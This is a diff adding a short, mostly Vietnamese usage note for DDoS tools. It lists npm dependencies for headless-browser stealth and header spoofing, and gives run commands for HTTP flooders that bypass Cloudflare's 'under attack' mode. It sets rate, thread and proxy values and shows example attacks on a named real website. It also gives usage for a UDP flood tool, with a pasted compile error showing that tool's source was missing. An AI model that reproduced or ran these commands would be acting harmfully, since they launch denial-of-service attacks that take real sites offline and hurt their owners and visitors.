@@ -1,0 +1,15 @@
+use uam : npm install cluster colors colorama axios crypto discord.js gradient-string user-agents header-generator hpack puppeteer puppeteer-extra puppeteer-extra-plugin-stealth puppeteer-real-browser
+node UAM.js target time rate thread cookiecount
+node cfhieu.js target time rate thread proxyfile
+thì rate từ 17 - 64, thread 5-10 tuỳ og, chỗ cookiecount là số lần bypass, khuyến nghị tầm 4--6-8 cookiecount là đủ r
+vd hi.js :node hi /attack https://thoibao.de/ 120 60 17 5 4
+node cfhieu.js https://thoibao.de/ 120 64 10 proxy.txt
+
+sudo apt update && sudo apt install build-essential -y
+gcc udpbypass.c -o udpbypass -pthread
+cc1: fatal error: udpbypass.c: No such file or directory
+compilation terminated.
+root@113612906576785278333Ric:~#
+
+udpbypass : ./udpbypass ip port 1472 brust ( 512 or 1024 ) 
+hieu.js config thì rate tầm 64 or 32 , thread 5 tầm cỡ đó là đc
